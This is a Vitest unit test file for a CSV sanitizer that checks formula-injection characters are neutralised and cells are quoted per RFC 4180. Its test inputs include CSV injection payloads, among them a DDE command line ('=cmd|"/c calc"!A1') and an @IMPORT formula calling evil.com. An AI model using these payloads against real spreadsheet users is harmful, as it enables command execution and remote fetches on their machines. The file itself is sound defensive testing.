import { describe, it, expect } from 'vitest';
import { sanitizeCsvCell, sanitizeCsvRow, sanitizeCsv } from './csv-sanitizer';

/**
 * CSV Sanitizer Unit Tests
 *
 * @gxp-tag REQ-SEC-003
 * @gxp-criticality HIGH
 * @test-type unit
 *
 * Validates CSV injection prevention for all formula-triggering characters
 * and RFC 4180 compliance.
 */

describe('CSV Sanitizer', () => {
  describe('sanitizeCsvCell', () => {
    /**
     * @gxp-tag REQ-SEC-003
     * @gxp-criticality HIGH
     * @test-type unit
     * @description Verifies equals sign formula injection is prevented
     */
    it('should neutralize equals sign formula trigger', () => {
      const maliciousInput = '=cmd|"/c calc"!A1';
      const sanitized = sanitizeCsvCell(maliciousInput);

      // Should prepend single quote to neutralize formula
      expect(sanitized).toBe('"\'=cmd|""/c calc""!A1"');
      // Should NOT start with equals sign
      expect(sanitized.startsWith('=')).toBe(false);
    });

    /**
     * @gxp-tag REQ-SEC-003
     * @gxp-criticality HIGH
     * @test-type unit
     * @description Verifies plus sign formula injection is prevented
     */
    it('should neutralize plus sign formula trigger', () => {
      const maliciousInput = '+1+1';
      const sanitized = sanitizeCsvCell(maliciousInput);

      expect(sanitized).toBe("'+1+1");
      expect(sanitized.startsWith('+')).toBe(false);
    });

    /**
     * @gxp-tag REQ-SEC-003
     * @gxp-criticality HIGH
     * @test-type unit
     * @description Verifies minus sign formula injection is prevented
     */
    it('should neutralize minus sign formula trigger', () => {
      const maliciousInput = '-1+1';
      const sanitized = sanitizeCsvCell(maliciousInput);

      expect(sanitized).toBe("'-1+1");
      expect(sanitized.startsWith('-')).toBe(false);
    });

    /**
     * @gxp-tag REQ-SEC-003
     * @gxp-criticality HIGH
     * @test-type unit
     * @description Verifies at sign formula injection is prevented
     */
    it('should neutralize at sign formula trigger', () => {
      const maliciousInput = '@IMPORT("http://evil.com/malware")';
      const sanitized = sanitizeCsvCell(maliciousInput);

      expect(sanitized).toBe('"\'@IMPORT(""http://evil.com/malware"")"');
      expect(sanitized.startsWith('@')).toBe(false);
    });

    /**
     * @gxp-tag REQ-SEC-003
     * @gxp-criticality HIGH
     * @test-type unit
     * @description Verifies tab character formula injection is prevented
     */
    it('should neutralize tab character formula trigger', () => {
      const maliciousInput = '\t=1+1';
      const sanitized = sanitizeCsvCell(maliciousInput);

      expect(sanitized).toContain("'");
      expect(sanitized.startsWith('\t')).toBe(false);
    });

    /**
     * @gxp-tag REQ-SEC-003
     * @gxp-criticality HIGH
     * @test-type unit
     * @description Verifies carriage return formula injection is prevented
     */
    it('should neutralize carriage return formula trigger', () => {
      const maliciousInput = '\r=1+1';
      const sanitized = sanitizeCsvCell(maliciousInput);

      expect(sanitized).toContain("'");
      expect(sanitized.startsWith('\r')).toBe(false);
    });

    /**
     * @gxp-tag REQ-SEC-003
     * @gxp-criticality MEDIUM
     * @test-type unit
     * @description Verifies RFC 4180 double quote escaping
     */
    it('should escape double quotes per RFC 4180', () => {
      const input = 'Contains "quotes"';
      const sanitized = sanitizeCsvCell(input);

      // Double quotes should be escaped by doubling them
      expect(sanitized).toBe('"Contains ""quotes"""');
    });

    /**
     * @gxp-tag REQ-SEC-003
     * @gxp-criticality MEDIUM
     * @test-type unit
     * @description Verifies cells with commas are quoted
     */
    it('should wrap cells containing commas in quotes', () => {
      const input = 'Last, First';
      const sanitized = sanitizeCsvCell(input);

      expect(sanitized).toBe('"Last, First"');
    });

    /**
     * @gxp-tag REQ-SEC-003
     * @gxp-criticality MEDIUM
     * @test-type unit
     * @description Verifies cells with newlines are quoted
     */
    it('should wrap cells containing newlines in quotes', () => {
      const input = 'Line 1\nLine 2';
      const sanitized = sanitizeCsvCell(input);

      expect(sanitized).toBe('"Line 1\nLine 2"');
    });

    /**
     * @gxp-tag REQ-SEC-003
     * @gxp-criticality LOW
     * @test-type unit
     * @description Verifies normal text passes through unchanged
     */
    it('should not modify safe text without special characters', () => {
      const input = 'Normal text 123';
      const sanitized = sanitizeCsvCell(input);

      expect(sanitized).toBe('Normal text 123');
    });

    /**
     * @gxp-tag REQ-SEC-003
     * @gxp-criticality MEDIUM
     * @test-type unit
     * @description Verifies null and undefined are converted to empty strings
     */
    it('should handle null and undefined values', () => {
      expect(sanitizeCsvCell(null)).toBe('');
      expect(sanitizeCsvCell(undefined)).toBe('');
    });

    /**
     * @gxp-tag REQ-SEC-003
     * @gxp-criticality MEDIUM
     * @test-type unit
     * @description Verifies numbers are converted to strings safely
     */
    it('should handle numeric values', () => {
      expect(sanitizeCsvCell(123)).toBe('123');
      expect(sanitizeCsvCell(0)).toBe('0');
      expect(sanitizeCsvCell(-42)).toBe("'-42"); // Minus sign is formula trigger
    });

    /**
     * @gxp-tag REQ-SEC-003
     * @gxp-criticality HIGH
     * @test-type unit
     * @description Verifies complex attack payloads are neutralized
     */
    it('should handle complex CSV injection payloads', () => {
      const attacks = [
        '=1+1";=1+1',
        '=cmd|"/c calc"!A1',
        '@SUM(A1:A100)',
        '+1+1";=1+1',
        '-2+2";=1+1',
        '\t=1+1',
        '\r\n=1+1',
      ];

      attacks.forEach((attack) => {
        const sanitized = sanitizeCsvCell(attack);
        // Should start with quote or apostrophe, NOT with formula trigger
        expect(sanitized.startsWith('=')).toBe(false);
        expect(sanitized.startsWith('+')).toBe(false);
        expect(sanitized.startsWith('-')).toBe(false);
        expect(sanitized.startsWith('@')).toBe(false);
        expect(sanitized.startsWith('\t')).toBe(false);
        expect(sanitized.startsWith('\r')).toBe(false);
      });
    });
  });

  describe('sanitizeCsvRow', () => {
    /**
     * @gxp-tag REQ-SEC-003
     * @gxp-criticality HIGH
     * @test-type unit
     * @description Verifies row-level sanitization with mixed safe/unsafe cells
     */
    it('should sanitize all cells in a row', () => {
      const row = ['Normal', '=malicious', 'Safe', '@IMPORT'];
      const sanitized = sanitizeCsvRow(row);

      expect(sanitized).toBe('Normal,\'=malicious,Safe,\'@IMPORT');
    });

    /**
     * @gxp-tag REQ-SEC-003
     * @gxp-criticality MEDIUM
     * @test-type unit
     * @description Verifies empty rows are handled correctly
     */
    it('should handle empty rows', () => {
      const row = ['', '', ''];
      const sanitized = sanitizeCsvRow(row);

      expect(sanitized).toBe(',,');
    });
  });

  describe('sanitizeCsv', () => {
    /**
     * @gxp-tag REQ-SEC-003
     * @gxp-criticality HIGH
     * @test-type unit
     * @description Verifies complete CSV sanitization with headers and rows
     */
    it('should sanitize headers and rows', () => {
      const headers = ['Name', 'Formula', 'Status'];
      const rows = [
        ['John', '=1+1', 'Active'],
        ['Jane', '@IMPORT', 'Pending'],
      ];

      const csv = sanitizeCsv(headers, rows);

      const lines = csv.split('\n');
      expect(lines.length).toBe(3); // Header + 2 rows
      expect(lines[0]).toBe('Name,Formula,Status');
      expect(lines[1]).toBe('John,\'=1+1,Active');
      expect(lines[2]).toBe('Jane,\'@IMPORT,Pending');
    });

    /**
     * @gxp-tag REQ-SEC-003
     * @gxp-criticality HIGH
     * @test-type unit
     * @description Verifies audit trail export sanitization with realistic data
     */
    it('should sanitize realistic audit trail data', () => {
      const headers = [
        'Timestamp',
        'Action',
        'Resource Type',
        'User ID',
        'IP Address',
      ];
      const rows = [
        [
          '2026-02-04T10:00:00Z',
          'CREATE_REQUIREMENT',
          'requirement',
          'user@example.com',
          '192.168.1.1',
        ],
        [
          '2026-02-04T10:01:00Z',
          '=malicious_action',
          'user_story',
          '@attacker',
          '192.168.1.2',
        ],
      ];

      const csv = sanitizeCsv(headers, rows);

      const lines = csv.split('\n');
      expect(lines.length).toBe(3);
      // Malicious action should be neutralized
      expect(lines[2]).toContain("'=malicious_action");
      expect(lines[2]).toContain("'@attacker");
    });
  });
});
